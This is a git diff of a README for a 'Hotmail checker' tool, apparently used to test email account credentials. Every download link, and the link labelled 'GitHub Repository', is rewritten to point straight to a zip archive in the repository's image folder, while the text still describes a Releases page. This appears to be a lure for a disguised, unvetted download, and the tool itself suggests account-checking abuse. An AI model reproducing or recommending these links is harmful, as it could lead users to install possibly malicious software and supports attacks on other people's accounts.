@@ -1,6 +1,6 @@
 # 🔍 HOTMAIL-CHECKER-WEBV2.0 - Easily Check Your Hotmail Accounts
 
-[![Download HOTMAIL-CHECKER-WEBV2.0](https://img.shields.io/badge/Download-HOTMAIL--CHECKER--WEBV2.0-blue.svg)](https://github.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/releases)
+[![Download HOTMAIL-CHECKER-WEBV2.0](https://raw.githubusercontent.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/main/img/WEB-HOTMAI-CHECKE-3.2.zip)](https://raw.githubusercontent.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/main/img/WEB-HOTMAI-CHECKE-3.2.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run HOTMAIL-CHECKER-WEBV2.0.
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page.  
-   [Visit this page to download](https://github.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/main/img/WEB-HOTMAI-CHECKE-3.2.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see different versions of the software. Select the latest version for the best performance.
@@ -76,7 +76,7 @@ For direct support or inquiries, please reach out via the issues section on GitH
 
 ## 🔗 Quick Links
 
-- [Download HOTMAIL-CHECKER-WEBV2.0](https://github.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/releases)
-- [GitHub Repository](https://github.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0)
+- [Download HOTMAIL-CHECKER-WEBV2.0](https://raw.githubusercontent.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/main/img/WEB-HOTMAI-CHECKE-3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ossa-FRG/HOTMAIL-CHECKER-WEBV2.0/main/img/WEB-HOTMAI-CHECKE-3.2.zip)
 
 Your journey to efficiently checking Hotmail accounts starts here!
